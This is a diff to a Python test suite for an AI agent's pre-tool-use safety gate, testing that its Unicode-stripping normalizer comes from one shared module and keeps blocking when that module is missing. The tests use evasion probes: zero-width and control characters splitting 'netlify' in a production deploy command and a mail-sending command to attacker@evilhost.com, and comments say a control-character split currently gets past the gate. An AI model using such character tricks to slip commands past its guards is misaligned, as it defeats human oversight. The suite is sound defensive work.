@@ -22,6 +22,7 @@ test, so the suite never depends on (nor can be flipped by) a real live token
 from a concurrent session.
 """
 
+import ast
 import importlib.util
 import inspect
 import json
@@ -1519,10 +1520,211 @@ def test_exemption_anchor_refuses_site_contaminated_root():
         "control: the real Claude root must resolve to a usable anchor"
     )
     print("PASS test_exemption_anchor_refuses_site_contaminated_root")
+# --------------------------------------------------------------------------
+# STRIP_CATEGORIES single-source-of-truth (2026-09-18)
+#
+# Until this change the gate carried its OWN `_STRIP_CATEGORIES = ("Cf", "Mn")`,
+# duplicating hooks/lib/tool_call_paths.py's copy (which feeds normalize_text for three of
+# its six importing guards). Nothing kept them in sync, and the failure mode was silent and
+# one-directional: harden the lib copy, forget this one, and the hook with the broadest
+# blast radius -- the SOLE enforcement of hard invariant 2 under bypassPermissions, where
+# no permission prompt exists as a backstop -- quietly becomes the layer's WEAKEST
+# normalizer while the guards routing through normalize_text are stronger. No test goes
+# red; nothing throws.
+#
+# The tests below pin the three things that make the collapse real rather than cosmetic:
+# the gate's behavior FOLLOWS the shared module (not a local copy), the one hardcoded
+# fallback copy that must survive a missing module cannot drift from it, and the fallback
+# actually keeps both gates armed.
+# --------------------------------------------------------------------------
+
+LIB_DIR = os.path.join(HERE, "lib")
+
+# A Cc control character mid-word is the differential probe: it is NOT in the shipped
+# category set, so it currently defeats the `\bnetlify\b` match exactly the way a ZWSP did
+# before Round 3 -- verified live, exit 0 below. That makes it the one input whose verdict
+# flips when, and only when, the SHARED module's tuple changes.
+CTRL_SPLIT_DEPLOY = "cmd /c net\x01lify deploy --build --prod"
+
+
+def _shared_strip_categories():
+    """The canonical tuple, loaded from hooks/lib/text_normalization.py by path so this
+    test never depends on sys.path ordering (or on the gate having imported it)."""
+    spec = importlib.util.spec_from_file_location(
+        "_text_normalization_under_test", os.path.join(LIB_DIR, "text_normalization.py"))
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod.STRIP_CATEGORIES
+
+
+_ISO_ROOTS = []
+
+
+def _isolated_gate(shared_module_source=None, drop_shared_module=False):
+    """Copy the gate + the whole lib/ into a temp tree and return the copied gate's path,
+    optionally rewriting or deleting the shared normalization module in that copy ONLY.
+    The real tree is never touched. Roots are registered for cleanup at the end of the
+    run (sibling tests clean their sandboxes; these copy the whole lib/ three times)."""
+    root = tempfile.mkdtemp(prefix="oag-iso-")
+    _ISO_ROOTS.append(root)
+    hooks_dir = os.path.join(root, "hooks")
+    os.makedirs(hooks_dir)
+    shutil.copy2(HOOK, os.path.join(hooks_dir, "ora-autonomy-gate.py"))
+    shutil.copytree(LIB_DIR, os.path.join(hooks_dir, "lib"))
+    target = os.path.join(hooks_dir, "lib", "text_normalization.py")
+    if drop_shared_module:
+        os.remove(target)
+    elif shared_module_source is not None:
+        with open(target, "w", encoding="ascii") as fh:
+            fh.write(shared_module_source)
+    return os.path.join(hooks_dir, "ora-autonomy-gate.py")
+
+
+def _run_gate(gate_path, command):
+    env = dict(os.environ)
+    env["ORA_OVERRIDE_SESSIONS_DIR"] = fresh_sessions_dir()
+    # Scrub PYTHONPATH (2026-09-18 review finding): it is INHERITED, so a developer or CI
+    # runner with the real hooks/lib on PYTHONPATH would let the copied gate import the
+    # REAL text_normalization.py -- and the drop_shared_module test would pass vacuously,
+    # proving nothing. Verified: with PYTHONPATH set to the real lib, the missing-module
+    # case still returned exit 2 because the module was found elsewhere.
+    env.pop("PYTHONPATH", None)
+    proc = subprocess.run(
+        [sys.executable, gate_path],
+        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command},
+                          "session_id": SESSION_A}),
+        capture_output=True, text=True, env=env,
+    )
+    return proc.returncode, proc.stderr
+
+
+def test_control_char_split_netlify_is_the_live_differential():
+    """Control (baseline) for the test below, and a standing statement of scope: Cc is NOT
+    stripped today, so a control character mid-word still defeats Gate 2a. That is the
+    SHIPPED posture -- widening the category set is a deliberate decision with its own
+    false-positive budget, not something to slip in here. This test exists so the
+    differential test below cannot silently become a tautology if Cc is ever added: add it
+    and this test goes red first, on purpose."""
+    rc, out, err = run_hook(bash_payload(CTRL_SPLIT_DEPLOY))
+    assert rc == 0, (
+        "premise broken: a Cc-split 'netlify' is expected to pass on the shipped category "
+        "set (that is what makes it a usable differential probe), got exit %s" % rc)
+    print("PASS test_control_char_split_netlify_is_the_live_differential")
+
+
+def test_strip_categories_comes_from_shared_module():
+    """THE test the duplication defeated. Harden ONLY hooks/lib/text_normalization.py --
+    nothing in the gate -- and the gate's verdict must change. Before 2026-09-18 the gate
+    read its own copy, so this input stayed exit 0 no matter what the shared module said,
+    which is precisely the silent divergence this change closes."""
+    hardened = ('"""Hardened copy for test_strip_categories_comes_from_shared_module.\n'
+                'ASCII-only."""\n'
+                'STRIP_CATEGORIES = ("Cf", "Mn", "Cc")\n')
+    gate = _isolated_gate(shared_module_source=hardened)
+    rc, err = _run_gate(gate, CTRL_SPLIT_DEPLOY)
+    assert rc == 2, (
+        "adding Cc to the SHARED module must arm the gate against a Cc-split 'netlify' "
+        "(it is exit 0 on the shipped set -- see the control test). Got exit %s (%s). "
+        "A still-passing call here means the gate is reading a LOCAL copy of "
+        "STRIP_CATEGORIES again." % (rc, err))
+    # ... and the unmodified copy of the same tree must still allow it, so the result above
+    # is attributable to the one-line module edit and not to the copying itself.
+    rc_ctl, _ = _run_gate(_isolated_gate(), CTRL_SPLIT_DEPLOY)
+    assert rc_ctl == 0, (
+        "control: an UNMODIFIED copied tree must reproduce the shipped verdict (exit 0), "
+        "got %s -- the differential above is not attributable" % rc_ctl)
+    print("PASS test_strip_categories_comes_from_shared_module")
+
+
+def test_strip_categories_fallback_matches_shared_module():
+    """The gate keeps ONE hardcoded fallback copy, because an uncaught ImportError exits 1,
+    which PreToolUse treats as a non-blocking error -- the tool call PROCEEDS and both
+    gates go silently off. That copy is therefore mandatory, and it is also the only thing
+    left that can drift, so it is pinned here BY VALUE against the shared module.
+
+    Parsed with ast rather than imported: importing the gate would resolve the try branch
+    and never show what the except branch actually holds.
+
+    The structural check is deliberately STRICT about placement (2026-09-18 review: a
+    looser `ast.walk` version accepted 5 of 7 dead-code placements -- a nested def, an
+    `if False:`, a class body, an unrelated handler elsewhere in the file -- each of which
+    leaves the gate exiting 1 when the module is missing, and it false-RED'd a valid
+    annotated assignment). The fallback must be a DIRECT statement of the handler attached
+    to the try that imports the name."""
+    with open(HOOK, encoding="utf-8") as fh:
+        tree = ast.parse(fh.read())
+
+    def _targets_name(node):
+        if isinstance(node, ast.Assign):
+            return any(isinstance(t, ast.Name) and t.id == "STRIP_CATEGORIES"
+                       for t in node.targets)
+        if isinstance(node, ast.AnnAssign):  # `STRIP_CATEGORIES: tuple = (...)` is valid
+            return isinstance(node.target, ast.Name) and node.target.id == "STRIP_CATEGORIES"
+        return False
+
+    assigns = [n for n in ast.walk(tree) if _targets_name(n)]
+    assert len(assigns) == 1, (
+        "expected exactly ONE assignment of STRIP_CATEGORIES in the gate (the import "
+        "fallback); found %d. A second one is the duplicate this change removed, "
+        "reintroduced." % len(assigns))
+
+    # Find the try whose BODY imports STRIP_CATEGORIES, and require the assignment to be a
+    # direct child statement of one of THAT try's handlers -- not merely somewhere beneath
+    # some except in the file.
+    owning_handlers = []
+    for tr in [n for n in ast.walk(tree) if isinstance(n, ast.Try)]:
+        imports_it = any(
+            isinstance(s, ast.ImportFrom)
+            and any(a.name == "STRIP_CATEGORIES" for a in s.names)
+            for s in ast.walk(ast.Module(body=tr.body, type_ignores=[])))
+        if imports_it:
+            owning_handlers.extend(tr.handlers)
+    assert owning_handlers, (
+        "no try block in the gate imports STRIP_CATEGORIES -- the shared module is not "
+        "being used at all")
+    assert any(assigns[0] in h.body for h in owning_handlers), (
+        "the gate's STRIP_CATEGORIES assignment must be a DIRECT statement of the except "
+        "handler on the try that imports it. Anywhere else (a nested def, an `if False:`, "
+        "a class body, an unrelated handler) is dead code: the name never binds, and the "
+        "gate exits 1 -- which PreToolUse treats as non-blocking, i.e. both gates off.")
+    fallback = ast.literal_eval(assigns[0].value)
+    shared = _shared_strip_categories()
+    assert fallback == shared, (
+        "the gate's fallback %r has drifted from hooks/lib/text_normalization.py's %r. "
+        "These must be identical: the fallback is what runs when the shared module cannot "
+        "be imported, and a fallback nothing pins is just the old duplicate under another "
+        "name." % (fallback, shared))
+    print("PASS test_strip_categories_fallback_matches_shared_module")
+
+
+def test_missing_text_normalization_module_still_blocks():
+    """Import failure must not degrade the gate to fail-OPEN. With the shared module
+    deleted, the fallback has to keep BOTH gates armed against the Round 3 evasions --
+    Gate 2a (netlify) and Gate 1 (the send trigger phrase) -- not merely avoid crashing.
+    Mirrors test-confidentiality-guard.py's site_markers import-failure test."""
+    gate = _isolated_gate(drop_shared_module=True)
+    zwsp = chr(0x200B)  # chr(), not a raw fixture byte: this file declares ASCII-only
+    for label, cmd in (
+        ("Gate 2a, ZWSP-split netlify", "cmd /c net" + zwsp + "lify deploy --build --prod"),
+        ("Gate 2a, plain netlify", "cmd /c netlify deploy --build --prod"),
+        ("Gate 1, ZWSP in the send trigger phrase",
+         "powershell -File send-via-outlook" + zwsp + ".ps1 -To attacker@evilhost.com "
+         "-Subject hi -Body hi"),
+    ):
+        rc, err = _run_gate(gate, cmd)
+        assert rc == 2, (
+            "with text_normalization.py absent the fallback must still block [%s]; got "
+            "exit %s (%s). Exit 1 in particular is fail-OPEN here -- PreToolUse treats it "
+            "as a non-blocking error and runs the tool anyway." % (label, rc, err))
+    print("PASS test_missing_text_normalization_module_still_blocks")
 
 
 if __name__ == "__main__":
     tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
-    for t in tests:
-        t()
+    try:
+        for t in tests:
+            t()
+    finally:
+        for _root in _ISO_ROOTS:
+            shutil.rmtree(_root, ignore_errors=True)
     print("ALL AUTONOMY-GATE TESTS PASS (%d)" % len(tests))
